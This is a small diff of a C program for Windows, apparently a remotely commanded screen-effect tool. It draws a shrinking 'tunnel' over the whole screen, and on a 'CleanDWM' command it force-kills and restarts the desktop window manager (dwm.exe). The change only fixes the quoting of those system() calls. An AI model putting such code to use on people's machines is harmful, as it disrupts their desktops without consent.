@@ -86,8 +86,8 @@ void ltunnel_run() {
 
     HDC hdc = GetDC(NULL);
     
-    int newW = w - (20* w / 100);
-    int newH = h - (20 * h / 100);
+    int newW = w - (10 * w / 100);
+    int newH = h - (10 * h / 100);
 
     // centro
     int x = (w - newW) / 2;
@@ -242,8 +242,8 @@ int main() {
             Sleep(20000);
         }
         else if (strstr(reqtextbuffer, "CleanDWM")) {
-            system(TASKKILL /F /IM dwm.exe); // killa dwm (previsto: riavvio automatico di DWM)
-            system(start dwm.exe); // avvio di dwm (nel caso windows non lo riavvi automaticamente)
+            system("TASKKILL /F /IM dwm.exe"); // killa dwm (previsto: riavvio automatico di DWM)
+            system("start dwm.exe"); // avvio di dwm (nel caso windows non lo riavvi automaticamente)
         }
 
         else {Sleep(20000);}
